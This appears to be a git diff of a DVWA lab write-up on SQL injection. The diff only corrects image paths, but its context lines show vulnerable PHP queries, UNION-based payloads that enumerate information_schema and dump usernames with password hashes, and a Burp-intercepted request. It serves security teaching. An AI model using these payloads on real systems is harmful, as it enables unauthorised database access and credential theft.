@@ -24,7 +24,7 @@ $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die(...);
 ```
 
-![Low level source code](assests/low-source-code.png)
+![Low level source code](assets/low-source-code.png)
 Whatever the user sends as `id` becomes part of the query. There is no sanitization, no type checking, no prepared statements — nothing standing between user input and the database.
 
 ### Exploitation — Step by Step
@@ -75,7 +75,7 @@ The database version is now leaked. This matters because different versions have
 
 `information_schema` is a built-in MySQL database that stores metadata about all other databases — table names, column names, data types. Querying it is a standard enumeration technique.
 
-![Table enumeration output](assests/low-level-table.png)
+![Table enumeration output](assets/low-level-table.png)
 
 **Output observed:** Tables `guestbook` and `users` are present.
 
@@ -85,7 +85,7 @@ The database version is now leaked. This matters because different versions have
 1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#
 ```
 
-![Column enumeration output](assests/low-level-column.png)
+![Column enumeration output](assets/low-level-column.png)
 
 **Columns discovered:** `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login`, `failed_login`
 
@@ -95,7 +95,7 @@ The database version is now leaked. This matters because different versions have
 1' UNION SELECT user, password FROM users#
 ```
 
-![Password dump](assests/low-level-password.png)
+![Password dump](assets/low-level-password.png)
 **Output observed:**
 ```
 First name: admin       Surname: 5f4dcc3b5aa765d61d8327deb882cf99
@@ -123,7 +123,7 @@ The input method changed from a free-text field to a dropdown menu — at first 
 $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
 $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
 ```
-![Medium source code](assests/source-code-medium.png)
+![Medium source code](assets/source-code-medium.png)
 
 Two things to note here:
 - `mysqli_real_escape_string` escapes special characters like quotes — but the query uses no quotes around `$id`. Escaping quotes is useless when the parameter is unquoted in an integer context.
@@ -143,12 +143,12 @@ Since the restriction is only in the browser UI, intercepting and modifying the 
 ```
 id=1 UNION SELECT user,password FROM users#&Submit=Submit
 ```
-![Burp Suite intercept](assests/medium-burpsuite.png)
+![Burp Suite intercept](assets/medium-burpsuite.png)
 
 7. Click **Forward** to send the modified request
 
 Since the column enumeration was already done at Low level, credentials can be extracted directly without repeating the reconnaissance steps.
-![Medium Output](assests/medium-level-pass.png)
+![Medium Output](assets/medium-level-pass.png)
 **Output observed:** Same credential dump as Low — all user hashes extracted successfully.
 
 ### Why Medium Was Still Exploitable
@@ -164,9 +164,9 @@ The developer attempted to fix the vulnerability by removing the text input fiel
 Two visible changes at this level:
 - The input is now delivered through a separate popup window
 - The query has a `LIMIT 1` clause added:
-![High level popup interface](assests/interface-high.png)
+![High level popup interface](assets/interface-high.png)
 
-![High level source code](assests/source-code-high.png)
+![High level source code](assets/source-code-high.png)
 ```php
 $id = $_SESSION['id'];
 $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
@@ -184,7 +184,7 @@ The payload structure is identical to Low. The `#` comment character causes the 
 
 Everything after `#` — including `LIMIT 1` — is treated as a comment and ignored. The full credential dump is returned.
 
-![High level password dump](assests/high-level-pass.png)
+![High level password dump](assets/high-level-pass.png)
 ### Why High Was Still Exploitable
 
 `LIMIT 1` limits the number of rows returned by the original query — it has no bearing on what an injected UNION clause can return. The fundamental vulnerability remains unchanged: user input is still concatenated into the query string without using parameterized queries. The `LIMIT` addition gives the appearance of hardening without addressing the actual attack surface.
